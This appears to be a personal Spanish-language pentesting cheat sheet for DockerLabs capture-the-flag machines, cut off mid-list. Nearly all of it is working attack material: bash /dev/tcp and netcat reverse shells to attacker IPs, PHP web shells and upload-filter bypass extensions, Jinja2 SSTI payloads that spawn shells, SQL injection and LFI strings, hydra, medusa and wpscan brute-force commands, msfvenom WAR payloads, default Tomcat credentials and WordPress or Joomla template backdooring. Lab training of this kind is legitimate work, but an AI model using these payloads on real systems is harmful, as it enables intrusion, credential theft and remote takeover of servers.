## 1.-Reverse shell:

1.1- PHP:

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

<?php ?>
    system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");


1.2- PYTHON:

código:
máquina showtimes -dockerlabs:

https://github.com/dfalla/Hacking---Dockerlabs/blob/showtimes/image-11.png

1.3- JAVA

código:
revisar la máquina pinguinazo -dockerlabs:

https://github.com/dfalla/Hacking---Dockerlabs/blob/pinguinazo/image-4.png

1.4- NODE

código:
revisar la máquina nodeClimb - dockerlabs:

https://github.com/dfalla/Hacking---Dockerlabs/blob/nodeclimb/image-5.png

1.5- RUBY


1.6- BASH

código:
máquina showtimes -dockerlabs:

https://github.com/dfalla/Hacking---Dockerlabs/blob/showtimes/image-16.png

enviar una bash desde comandos desde una máquina víctima (linux) a kali:


#!/bin/bash

bash -c 'bash -i >& /dev/tcp/IP-KALI/443 0>&1'

en kali hacemos:

nc -lvnp 443

-------------------------------------------------------------------------------

## 2.- Rutas para contraseñas de ataque de hydra

comando de ejemplo:

hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 -I

puerto 21 

hydra -l <usuario> -P <ruta_a_lista_contraseñas> -s 21 -t 4 -vV 192.168.42.193 ssh

existe la posibilidad de que me conecte por ssh y esté restringido la rbash 

por ejemplo en la máquia first:

ya conectado por ssh ejecuté el comando:

find / -perm -4000 2>/dev/null

y me salió el mensaje:

-rbash: /dev/null: restringido: no se puede redirigir la salida

solución:

me conecto de la siguiente manera:

ssh pi@10.0.2.10 -t "bash --noprofile"

rockyou:

/usr/share/wordlists/rockyou.txt

metasploit
/usr/share/wordlists/metasploit/unix_passwords.txt


rutas de usuarios:
/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

/usr/share/seclists/Usernames/Names/names.txt

/usr/share/metasploit-framework/data/wordlists/unix_users.txt

[+] ataque para mysql:

hydra -l user -P /usr/share/wordlists/rockyou.txt mysql://172.17.0.2

[+] atque para ftp

hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://172.17.0.2 -t 64 -I

[+] comando para ataque a ssh con medusa:

medusa -h 172.17.0.2 -u augustus -P /usr/share/wordlists/rockyou.txt -M ssh

ssh corre en el puerto 8899

medusa -h 172.17.0.2 -u augustus -P /usr/share/wordlists/rockyou.txt -M ssh -n 8899

[+] Para un formulario:

hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/admin.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos."

con dominio:

hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt realgob.dl http-post-form "/admin.php:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos." 

con cookie y dominio:

hydra -l admin -P /usr/share/wordlists/rockyou.txt "realgob.dl" http-post-form "/admin.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=t4ebcjusiu12d3olhsmneorq9t:F=Usuario o contraseña incorrectos." -F 


con medusa:

medusa -h 172.17.0.2 -U usuarios.txt -P contraseñas.txt -M web-form -m FORM:/login.php -m FORM-DATA:"username=&password=" -m DENY:"Nombre de usuario o contraseña incorrectos."


Los parámetros de username y password debemos verlo directamente del formulario haciendo ctrl + u y verificar que parámetros son.

-------------------------------------------------------------------------------

## 3.- Rutas para fuzzing web con gobuster

gobuster dir -t 200 -u http://172.17.0.1/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null

quitamos el -r para ver redirecciones, es importante, ver máquina elevator

/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

a veces hay error al hacer gobuster y una de las razón es porque el servidor web bloquea el user-agent

Aplicamos el siguiente comando para confirmar 

curl -s 192.168.42.151

si me sale el error 403, está bloqueando el user-agent

curl -s 192.168.42.151 -A jorgas

entonces lanzamos el siguiente comando para encontrar directorios:

wfuzz -c -t 200 --hc=404 -H "User-Agent: jorgas" -w /usr/share/seclists/Discovery/Web-Content/common.txt http://192.168.42.151/FUZZ

-------------------------------------------------------------------------------

## 4.-JENKINS

a.- Si hacemos gobuster a un servidor donde corre jenkins y encontrasmos

/cli (Status 200)

 hacemos lo siguiente:

a..1.- wget http://172.17.0.2:8080/jnlpJars/jenkins-cli.jar

a.2.- Buscamos usuarios:

java -jar jenkins-cli.jar -s http://172.17.0.2:8080/ -http connect-node "@/etc/passwd"

si está corriendo ssh, podemos hacer un ataque de fuerza bruta con hydra, o realizar otras técnicas.


b.- Jetty (10.0.13)

podemos entrar al directorio /script

y ejecutar el comando:

referencia, máquina jenkhack - dockerlabs:

https://github.com/dfalla/Hacking---Dockerlabs/blob/jenkhack/image-4.png

-------------------------------------------------------------------------------

## 5.- Si tenemos la posibilidad de subir un archivo .jpg, podemos subir una reverse shell, con la extensión .php.jpg, previamente ver con burp suite sobre las extensiones permitidas.

contenido del archivo:

<?php
system($_GET['cmd]);
?>

o colocarle el reverse shell de php que está en la sección 1.1

ubicamos el directorio donde se guardó el archivo .php.jpg, casi siempre en uploads

entonces para entrar en la máquina hacemos, ejemplo:

http://172.17.0.2/themes/uploads/674e227bb3cce.jpg?cmd=bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'

previamente nos ponemos en escucha con netcat por el puerto 443, para luego hacer clic en el archivo que se subió.

-------------------------------------------------------------------------------

## 6.- Técnica PORT Knocking

es una técnica de seguridad que permite ocultar servicios en un servidor (como SSH) cerrando sus puertos por defecto y abriéndolos solo cuando se envía una secuencia específica de intentos de conexión ("golpes" o knocks). Es útil para evitar escaneos de puertos y ataques automatizados

knock 172.17.0.2 7000 8000 9000 -v

knock 172.17.0.2 22 80 8080 -v

tambiién con la herramienta:

KnockIt

la clonamos:

https://github.com/eliemoutran/KnockIt.git

creamos un entorno virutal (apunte 66) e instalamos:

pip install itertools

forma de uso:

python3 knockit.py -b 192.168.42.177 65535 8888 54111 2>/dev/null

-------------------------------------------------------------------------------

## 7.- WFUZZ 

[+] Buscar un archivo en un ruta con wfuzz:

busca un archivo que contenga alguna palabra del archivo diccionario.txt en la ruta: http://172.17.0.2/hackademy/

wfuzz -c -z file,diccionario.txt --hc 404 http://172.17.0.2/hackademy/FUZZ_archivo.ext


[+] WEBSHELL:

si hacemos fuzzing web:

gobuster dir -t 200 -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,bak,sh,py,js,html -b 403,404 2>/dev/null

y encontramos lo siguiente:

/shell.php (Status:500) [Size:0]

puede que sea una webshel.

para encontrar el parámetro, utilizamos la herramienta:

Herramienta WFUZZ

wfuzz -c --hl=44 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.1/shell.php?FUZZ=id"

una vez encontrado el parámetro, nos ponemos en escucha por netcat y hacemos en la url:

forma 1:

http://172.17.0.2/shell.php?parameter=bash -c "bash -i >%26 /dev/tcp/IP-HACKER/443 0>%261"

forma 2:

url encodeamos esto:
php -r '$sock=fsockopen("172.17.0.200",4450);exec("/bin/bash <&3 >&3 2>&3");'

php%20-r%20%27%24sock%3Dfsockopen%28%22172.17.0.200%22%2C443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

luego lo pegamo en la url después del igual que está después del parámetro vulnerable.

http://172.17.0.2/shell.php?parameter=php%20-r%20%27%24sock%3Dfsockopen%28%22172.17.0.200%22%2C443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

en la forma 1 puede de que la conexión sea frágil y se rompa en al instante, la forma 2 es más robusta.

-------------------------------------------------------------------------------

## 8.- Siempre es bueno revisar si hay algún exploit para las diferentes versiones, como por ejemplo Grafana 8.3.0 que tiene su exploit para ver diferentes rutas dentro de la máquina donde se ejecuta grafana. 

-------------------------------------------------------------------------------

## 9.- A veces nos encontraremos con archivos comprimidos que tienen contraseña, podemos utilizar las herramientas de fcrackzip o JohnTheRipper

ruta del archivo para revisar el uso de las herramientas:

E:\Hacking\APUNTES\ARCHIVOS-COMPRIMIDOS-CON-CONTRASEÑA.txt

-------------------------------------------------------------------------------

## 10.- Descomprimir archivos:

.zip:

unzip archivo.zip

10.1.- Comprimir un archivo:

zip archivo.zip archivo.php

-------------------------------------------------------------------------------

## 11.- hacer fuzzing web para https:

Herramienta:

dirb

dirb http://172.17.0.2:443 /usr/share/seclists/Discovery/Web-Content/common.txt

-------------------------------------------------------------------------------

## 12.- SSTI -> SSTI (Server Side Template Injection)

buscamos la tecnologia con la que trabaja la web:

para este caso es flask 3.0.1 : ninja2

Descartamos con: 
<h1>Daniel</h1>

{{7*7}}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/bin/bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"').read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c 'bash -i >& /dev/tcp/172.17.0.3/443 0>&1').read() }}

{{request.application.__globals__.__builtins__.__import__('os').popen('nc -e /bin/sh 192.168.1.2 443').read()}}


Tenemos que ver la tecnología con que trabaja la web.

esto aplica para formularios, solo basta que un input sea vulnerable.

-------------------------------------------------------------------------------

## 13.- SQLInjection.

descartar vulnerabilidad:

' OR 1=1 -- -

Escribimos lo de arriba, en los todos los campos del formulario, por ejemplo en un formulario de login, se escribe en los 2 campos.

Al aplicar el comando de arriba, del OR, puede nos permita iniciar sesión o nos dé error, en ambos casos es vulnerable.

luego de que descartamos que es vulnerable, aplicamos SQLMAP.


Ruta de los comandos de SQLMAP:

E:\Hacking\APUNTES\HACKING WEB\Teoría, técnicas\SQLi - SQL Injection.txt

con las técnicas de SQLMAP, encontramos usuarios, contraseñas o acceso a directorios cuyo nombre puede ser un usuario o contraseña, que casualmente no se puede mostrar con gobuster.

casi siempre se hace los ataque de SQLMAP al login.

-------------------------------------------------------------------------------

## 14.- BYPASS para php:

posibles extensiones.

php
php3
php4
php5
php7
phtml
php.jpg
php.gif
php.png
php.txt
phps
phar
php.
php%00.jpg
inc
htaccess
php.xlxs
pℎp
PHP
PHp
pht
phtm
pgif
shtml
hphp
ctp
module

estas extensiones las utilizamos para el ataque snipper de burpsuite.

las que he utilizado hasta el momento:

phar
phtml
php.jpg
war

[+] ARTIFICIO  DE BYPASS:

cuando ningún bypass funcione, y solo el sistema me permita subir archivo jpeg, png, jpg, todas las extensiones de imagenes, podemos interceptar la petición con burpsuite, mandarlo al repeater y modificarte el Content - Type:

Content - Type: image/jpeg

<?php
system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
?>

luego presionamos en send, nos ponemos en escucha por el puerto 443, nos dirigimos a uploads y presionamos en el nombre del archivo que subimos, ejemplo rev.php..

El artificio es modificar el Content - Type

-------------------------------------------------------------------------------

## 15.- WORDPRESS

si tenemos una ip como por ejmplo 172.17.0.2 y está corriendo una web, y si al hacerle fuzzing web con gobuster encontrasmos una ruta como: /wordpress, debemos seguir haciendo fuzzing web con gobuster a /wordpress

a veces hay directorios como /backup que se descubren con gobuster, es importante darle seguimiento.

al hacerle fuzzing web podemos encontrar /wp-login.php

podemos usar wpscan para intentar encontrar usuarios

wpscan --url http://172.17.0.2/wordpress -e p,u

si por ejemplo encontramos un usuario mario, también podemos hacer un ataque de fuerza bruta con wpscan, para intentar encontrar la contraseña de mario:

wpscan --url http://172.17.0.2/wordpress/wp-login.php --usernames mario --passwords /usr/share/wordlists/rockyou.tx

por ejemplo la contraseña que se encontró fue daniel123

una vez que ya tenemos tanto el usuario como la contraseña, nos logueamos en wp-login.php.

Intrusión:

podemos hacerlos de 2 formas:

15.1.- Modificando el archivo functions.php, editarlo y colocarle una reverseshell en php, ver la sección 1.1, colocando el siguiente código dentro del archivo functions.php:

exec("/bin/bash -c ''bash-i >& /dev/tcp/172.17.0.1/443' ");

15.2.- Subir un plugin:

contenido el plugin:
máquina WalkingCMS - dockerlabs:

https://github.com/dfalla/Hacking---Dockerlabs/blob/WalkingCMS/image-8.png

en ambos casos colocarnos en escuchar con netcat

Una vez que ya estamos entro de la máquina podemos observar el archivo wp-config.php, es bueno siempre hecharle un ojo, puede que haya bases de datos con información que nos pueda ayudar a escalar privilegios

-------------------------------------------------------------------------------

## 16.- SMB 

-> ver archivo :

E:\Hacking\APUNTES\PROTOCOLOS - HERRAMIENTAS\SAMBA netbios-ssn 139-445.txt

## 17.- Si tenemos permisos sudo con:

/usr/bin/ls
/usr/bin/cat

podemos utilizar los para enumerar (ls) y ver (cat), dentro del directorio root.

## 18.- Para identificar el tipo de hash:

hash-identifier "hash"

según el tipo de hash podemos utilizar diferentes herramientas para el crackeo.

Desencriptar en base64

echo "ZXN0b2VzdW5zZWNyZXRvCg==" | base64 -d

-------------------------------------------------------------------------------

## 19.- Si tenemos una web donde corre tomcat, podemos utilizar las siguientes credenciales para iniciar sesión:

admin:admin
tomcat:tomcat
admin:
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat

podemos subir un archivo .war como reverse shell, ese archivo se crea con msfvenom:


msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.3 LPORT=443 -f war -o RevShell.war

-------------------------------------------------------------------------------

## 20.- comando para descubrir un LFI

herramienta wfuzz

wfuzz -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u htpp://172.17.0.2/index.php?FUZZ=../../../../../etc/passwd --hc 404 --hl 40 --hw 169 -c -t 200

ante del FUZZ siempre debe haber un archivo .php

para la intrusión, ver el archivo:

E:\Hacking\APUNTES\HACKING WEB\Teoría, técnicas\LFI - Local File Inclusion .txt

-------------------------------------------------------------------------------

## 21.- Si tenemos una imagen podemos realizar esteganografia o también osint inversa subiendo la imagen a google images.

si ves que solo hay una imagen en la máquina víctima, bajala y aplica lo mencionado.

para esteganografía ver el archivo:

E:\Hacking\APUNTES\IMAGENES, METADADOS, ESTEGANOGRAFIA O INFORMACIÓN OCULTA.txt

le aplicamos toda la esteganografia posible, strings exiftool, podemos encontrar diferentes cosas, como credenciales diferentes para acceso a algún protocolo.

-------------------------------------------------------------------------------

## 22.- Siempre hacer ctrl + u para visualizar el codigo de la web.

-------------------------------------------------------------------------------

## 23.-Supongamos que entré en un equipo que corre una web, con un usuario y con ese usuario no puedo escalar privilegios, puedo entrar en /var/www/html y modificar un archivo .php o crearlo y crear una reverse-shell para entrar como www-data y pueda que con ese usuario pueda escalar privilegios.

referencia, máquina allien - dockerlabs:

https://github.com/dfalla/Hacking---Dockerlabs/blob/allien/allien.md

-------------------------------------------------------------------------------

## 24.- Podemos pasar archivos creando un servidor en python con el comando:


en mi kali:

python3 -m http.server 80


y luego descargar una herramienta con:

wget http://172.17.0.1:80/linpeas.sh

curl -O http://172.17.0.1:80/linpeas.sh

-------------------------------------------------------------------------------

## 25.- Puedo identificar un JWT cuando empieza con:

ey.........

luego entramos en la web de jwt.io y vemos más datos.

-------------------------------------------------------------------------------

## 26.- Iniciar sesón en mysql:

mysql -h 172.17.0.1 -u username --password=contraseña

mostrar bases de datos:

SHOW DATABASES;

ejemplo:

twitxdb

USE  twitxdb;

mostrar tablas

SHOW TABLES;

ejmplo

users

SELECT * from users;

salir

EXIT;

-------------------------------------------------------------------------------

## 27.- JOOMLA

Intrusión:

System > Templates > Administrator Templates > Atun Details and Files y editamos el archivo index.php, modificamos el archivo por una revers shell en php, esto implica colocar netcat en escucha.

-------------------------------------------------------------------------------

## 28.- Muchas veces los usuarios usan una sola contraseña para la mayoria de sus accesos, como por ejemplo la contraseña para su acceso de base de datos también la pueden utilizar para iniciar sesión en una app importante.

-------------------------------------------------------------------------------

## 29.- A veces una ip está relacionada con un dominio, debemos modificar el archivo /etc/hosts y agregar esa ip con el dominio.

ejemplo:

en kali:

sudo nano /etc/hosts

172.17.0.2                   pressenter.hl

hay que checar si hay subdominios para agregar al etc/hosts

-------------------------------------------------------------------------------

## 30.- RCE (Ejecución remota de comandos)

si tenemos inputs puede haber varias opciones de ataque.

STTI

{{7*7}}

SQLi

' OR 1=1 -- -

RCE
; cat /etc/passwd 
; cat /etc/passwd

-------------------------------------------------------------------------------

## 31.- atque de JohnTheTipper:

john --format=Raw-MD5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

para el format vemos con hash-identifier el tipo de hash.

-------------------------------------------------------------------------------

## 32.- si al hacer nmap para ver versiones tenemos algo parecido a esto: 

3000/tcp open  http    syn-ack ttl 64 Node.js Express framewor

comando para probar una petición http, en este caso POST:

curl -X POST http://172.17.0.2:3000/recurso/ -H "Content-Type: application/json" -d '{"token":"tokentraviesito"}'

referencia máquina consolelog - dockerlabs:

E:\Hacking\APUNTES\Dockerlabs\Fácil\ConsoleLog.txt

-------------------------------------------------------------------------------

## 33.- Hay ocasiones en que el servidor ftp se visualizan archivos de la web, entonces podemos subir una reverseshell por ftp con el comando put.

referencia máquina anonymouspingu - dockerlabs:

https://github.com/dfalla/Hacking---Dockerlabs/blob/anonymouspingu/anonymouspingu.md

-------------------------------------------------------------------------------

## 34.- Descargar un archivo mediante scp:

desde la máquina vícitma al kali, siempre y cuando se tenga acceso mediante ssh.

en kali ejecutamos este comando

scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg ~/Downloads/

puerto diferente al 22, ejemplo el 8899

scp -P 8899 rosa@172.18.0.2:/home/rosa/-/backup_rosa.zip .


referencia máquina amor - dockerlabs:

https://github.com/dfalla/Hacking---Dockerlabs/blob/amor/amor.md

enviar desde kali a la máquina víctima
scp revshell.jar augustus@172.17.0.2:/tmp/revshell.jar

si ssh corre en un puerto diferente al 22, como en el 8899:

scp -P 8899 revshell.jar augustus@172.17.0.2:/tmp/revshell.jar


Si no está ejecutandose el ssh, podemos descargar cualquier archivo, levantando un servidor en el directorio dónde se encuentra el archivo y con un simple wget podemos descargar el archivo en mi kali, para esto debe estar instalado python en la máquina objetivo

referencia máquina file - dockerlabs:

https://github.com/dfalla/Hacking---Dockerlabs/blob/file/file.md

-------------------------------------------------------------------------------

## 35.- Lenguaje Brainfuck:


++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.

herramienta para desencriptar:

https://www.dcode.fr/brainfuck-language

-------------------------------------------------------------------------------

## 36.- En algunas ocasiones nos encontraremos con que tenemos varios usuarios en el sistema, y no tenemos nada como escalar a algunos de ellos, entonces podemos utilizar la herramienta multi-su_force:

https://github.com/Maciferna/multi-Su_Force

para hacer fuerza bruta, tenemos que descargar en kali para luego pasarla a la máquina objetivo, luego darles permisos chmod +x ./multi-su_force, pasarle un diccionario, ejemplo rockyou

./multi-su_force rockyou.txt


como siempre todo esto lo hacemos en el directorio tmp de la máquina objetivo.

nota: para varios usuarios utilizamos multi-su_force.sh y para un solo usuario utilizamos:

Linux-Su-Force.sh -> https://github.com/Maalfer/Sudo_BruteForce.git

forma de ejecucin (no se le da permiso de ejecución osea chmod +x Linux-Su-Force.sh)


bash Linux-Su-Force.sh seller rockyou.txt


-------------------------------------------------------------------------------

NIVEL MEDIO:
pwd

## 1.- WORDPRESS
 
A veces no funcionan la herramienta de wpscan, entonces lo que podemos hacer es buscar plugins que tengan vulnerabilidades, como por ejemplo, site editor que contiene un LFI, esto lo buscamos en searchsploit:

forma de buscar plugins:

curl -s -X GET "http://172.17.0.2/" | grep plugins

-------------------------------------------------------------------------------

## 2.- Entrar a un directorio llamado " - "

cd ./-

-------------------------------------------------------------------------------

## 3.- Conectarme por shh a un puerto que no es el 22

ejemplo, ssh corre en el puerto 8899

ssh rosa@172.18.0.2 -p 8899

-------------------------------------------------------------------------------

## 4.- Casi siempre tendremos que interceptar las peticiones con burp suite, generalmente de formularios, tanto el reapeter e intruder.

-------------------------------------------------------------------------------

## 5.- Si interceptamos un formulario con burpsuite y cuando enviamos parámetros (repeater), nos aparece este mensaje:

Error:     'utf-8' codec can't decode byte 0xa9 in position 1: invalid start byte

significa que el campo interpreta texto en base64, entonces lo que se procede es hacer lo siguiente:

comprobar si la teoría es cierta
echo "whoami" | base64echo
d2hvYW1pCg==

Ver los usuarios:
echo "cat /etc/passwd | grep bash" | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCBiYXNoCg==

puede que en la máquina esté corriendo el ssh, podemos hacer fuerza bruta con el usuario encontrado y podemos acceder a la máquina.

-------------------------------------------------------------------------------

## 6.- Siempre que entremos a una máquina por ssh y queremos escalar privilegios, debemos ir descartando cosa por cosa, por ejemplo:

verificamos el archivo .bashrc que está en el home de cada usuario.

1ero, ver los grupos a los que pertenece el usuario, con el comando id

2do, find / -name "*.txt" 2>/dev/null
	Buscar archivos dentro del sistema con el usuario con el que te has conectado :

	find / -type f -user chocolatito 2>/dev/null

archivos de escritura:

find / -writable 2>/dev/null | grep -v -i -E 'proc|sys|dev|run|home|var|tmp'

Busque la palabra password

grep -Ri "password" / 2>/dev/null

ver permisos de ejecución sobre que archivos
find / -type f -perm -o+x 2>/dev/null

3ero, permisos SUID -> sudo -l
4to, binarios SUID -> 
	find / -perm -4000 2>/dev/null
	find / -perm -u=s 2>/dev/null
5to, contrabs -> cat /etc/crontab
6to, procesos -> ps -faux
7mo, capabilities
8vo, analizar archivos, como por ejemplo en /home/UserName
8no, buscar otras carpetas en todo el sistema
10mo, Linpeas / pspy64 / winpeas 

-------------------------------------------------------------------------------

## 7.- Hashes criptográficos generados en SHA-1.

Estos hashes suelen usarse para almacenar contraseñas u otros datos

sensibles de manera segura.


Herramienta para desencriptar:

https://github.com/PatxaSec/SHA_Decrypt

Problemas al instalar:

pip install tqdm

error: externally-managed-environment


Necesitamos un entorno virtual:

abrimos la terminal en la carpeta de la herramienta y ejecutamos:

python3 -m venv venv

source venv/bin/activate

pip install tqdm


ahora sí se puede ejecutar la herramienta:

hash:

$SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=

el salto es " d "

python3 sha2text.py 'd' '$SHA1$d$BjkVArB9RcGUs3sgVKyAvxzH0eA=' '/usr/share/wordlists/rockyou.txt'

-------------------------------------------------------------------------------

## 8.- El software Openfire 4.7.4 que corre generalmente en el puerto 9090, se puede hacer intrusión mediante metasploit.

exploit:

exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315

-------------------------------------------------------------------------------

## 9.- Siempre que tengamos un tipo de software corriendo en algún puerto de web, hay que buscar exploits, tanto en searchsploit, metasploit o algún github.

ejemplo como openfire 4.7.4 que corre en el puerto 9090 falta referencia

-------------------------------------------------------------------------------

## 10.- Ver los software que tienen exploit:

ejemplo:

grafana

openfire 4.7.4

apache ActiveMQ 5.15.15 :

https://github.com/dfalla/Hacking---Dockerlabs/blob/fooding/fodding.md

Apache solr 8.3.0 -> metasploit

CMS:

Joomla 
una vez ingresado en la siguiente ruta:
System > Templates > Administrator Templates > Atun Details and Files y editamos el archivo index.php

-------------------------------------------------------------------------------

## 11.- si en un puerto corre mongodb:

ejemplo: 

máquina collections - dockerlabs.


27017/tcp open  mongodb syn-ack ttl 64 MongoDB 7.0.9

mongo --host 172.17.0.1 --port 27017

comandos básicos:

monstrar bases de datos:
show dbs;

resultado del comando show dbs;
accessos
admin
config
local

acceder a una base de datos:
use accesos;

mostrar las colecciones:
show collections;

resultado el comando show collections:
usuarios

ver todos los documentos de la colección usuarios, mostrando los resultados en un formato más fácil de leer
db.usuarios.find().pretty();

-------------------------------------------------------------------------------

## 12.- Siempre que encontremos contraseñas hay que probarlas con los diferentes usuarios que encontremos, incluso con root

-------------------------------------------------------------------------------

## 13.- si queremos generar palabras aleatorioas de diferente cantiad de caracteres, podemos utilizar la herramienta crunch

crunch min max tipo -o nombre_archivo.txt

ejemplo:

solo numeros:

crunch 3 3 0123456789 -o dicnumeros.txt

solo letras:

crunch 3 3 abcdefghijklmnopqrstuvwyxz -o dicletras.txt

letras y números:

crunch 3 3 abcdefghijklmnopqrstuvwyxz0123456789 -o dicletras-num.txt

números y letras:

crunch 3 3 0123456789abcdefghijklmnopqrstuvwyxz -o diclnum-letras.txt

-------------------------------------------------------------------------------

## 14.- si tenemos una versión de un programa y al buscar un exploit hay una versión anterior, podemos probar la versión anterior, puede que funcione.

ejemplo:

Apache solr 8.3.0
versión anterior en searchsploit Apache solr 8.2.0

-------------------------------------------------------------------------------

## 15.- Si al acceder a una máquina con linux mediante metasploit y accedemos mediante meterpreter, para hacer la terminal más cómoda podemos ejecutar shell y luego mandar una bash a kali y ponernos en esucha mediante netcat:

Máquina víctima:

meterpreter > shell

puede que me salga una bash cómoda y si no es cómoda ejecutamos:

script /dev/null -c bash
 
y si aún con el comano script no funciona ejecutamos el bash -c

bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'

Máquina kali:

nc -lvnp 443 

y listo hemos accedido con una bash más cómoda.

-------------------------------------------------------------------------------

## 16.- tipos de encriptación

base64 ->
base85 -> https://www.dcode.fr/ascii-85-encoding
descifrador Ook! -> https://www.dcode.fr/ook-language

-------------------------------------------------------------------------------

## 17.- Los archivos .odt se pueden pasar a .zip y desconprimirlos con unzip

mv importante_octopus.odt importante_octopus.zip

unzip importante_octopus.zip

ejemplo máquina fileception - dockerlabs:

https://github.com/albertomarcostic/DockerLabs-WriteUps/blob/main/M%C3%A1quina%20Fileception.md

-------------------------------------------------------------------------------

## 18.- Archivos .kdbx con contraseña:

herramientas para abrirlo:

keepass2

keepass2 penguin.kdbx

keepassxc

keepassxc penguin.kdbx

también podemos abrirlo online:

https://app.keeweb.info/

crackear:

keepass2john penguin.kdbx > hash.txt

john hash.txt /usr/wordlists/rockyou.txt

-------------------------------------------------------------------------------

## 19.- A veces hay ocasiones en que tenemos que colocar un dominio con una ip en el /etc/hosts

al hacer gobuster, le hacemos al dominio, ejemplo:

gobuster dir -t 200 -u http://hidden.lab/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -b 403,404 2>/dev/null

si no encontramos nada de directorios o arhivos, podemos enumerar también con gobuster los subdominios, ya que tiene un dominio.

gobuster vhost -u http://hidden.lab/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 | grep -v "302" 

con el grep "200" filtramos los estados 200

para agregar un subdomino en el /etc/hosts

dominio:
172.17.0.2		hidden.lab

subdominio:
172.17.0.2		dev.hidden.lab


otra forma de enumerar subdominios:

wfuzz -H "Host: FUZZ.404-not-found.hl" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://404-not-found.hl --hw 28

otra forma de enumerar subdominos:

gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://unique.nyx --append-domain

también puedo aplicar gobuster para buscar archivosy directorios a un subdominio:

gobuster dir -t 200 -u http://tech.unique.nyx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html,db,png,jpg,git -b 403,404 2>/dev/null

-------------------------------------------------------------------------------

## 20.- si se nos permite subir un archivo malicioso con reverse shell, en cualquier lenguaje de backend, podemos acceder a la máquina de 2 formas:

nota: en ambas formas hay que colocar netcat en escucha con algún puerto.

Forma 1:

ubicar dónde se almacenó el archivo subido, generalmante en el directorio uploads y hacerle clic y listo.

Forma 2:

el reverse shell tiene el siguiente contenido:

<?php ?>
	system($_GET['cmd']);

ubicamos la carpeta dónde se subió, en la url y colocamos:

en el ejemplo se subió un archivo cmd.phar:

http://dev.hidden.lab/uploads/cmd.phar?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.40/443 0>%261"

se agregó la línea:
cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.40/443 0>%261"

-------------------------------------------------------------------------------

## 21.- Si no podemos transferir un archivo por wget o por curl, podemos subirlo mediante la web, si es el caso de que la web me permite subir cualquier archivo, el rockyou se tiene que subir una parte.

ejemplo:

maquina hidden de dockerlabs.

también para subir algo y wget no está disponible podemos usar 

vemos si está instalado busybox

which busybox

y si está instalado ejecutamos:

busybox wget url-descarga

-------------------------------------------------------------------------------

## 22.- siendo el usuario www-data, a veces con el cat /etc/passwd | grep bash no me permiten ver los usuarios, entonces tengo que entrar a home para ver los usarios que existen.

-------------------------------------------------------------------------------

## 23.- si en una web, en una pantalla me aparece el mensaje:

"Error de Sistema: ($_GET['archivo']");

puede que se trate de un LFI, y el parametro LFI seria "archvo", solo hay que encontrar en que parte de la url es accesible.

nota: No es necesario que en la url sea por ejemplo:

index.php?archivo=../../../../../../../etc/passwd

también puede ser:

/shop/?archivo=../../../../../../../../../../etc/passwd

o

/shop?archivo=../../../../../../../../../../etc/passwd

ya que en el directorio /shop no se encontró ningún archivo php

-------------------------------------------------------------------------------

## 24.- En algunos casos hay recursos compartidos con ssh mediante samba o ftp o rsync o algún otro servicio de recursos compartidos.

ejemplo máquina dance-samba - dockerlabs

entonces la siguiente técnica es cuando no tenemos una contraseña de ssh pero si un usuario y también el servidor samba está relacionado con ssh, también siempre y cuando tengamos permisos de escritura dentro del recurso compartido.

contenido dentro del servidor samba:

.bashrc
.cache
.bash_logout
.bash_history
.profile

todas estas carpetas ocultas están dentro del /home/usuario cuando te conectas por ssh:

técnica:

a. generamos un par de claves ssh:

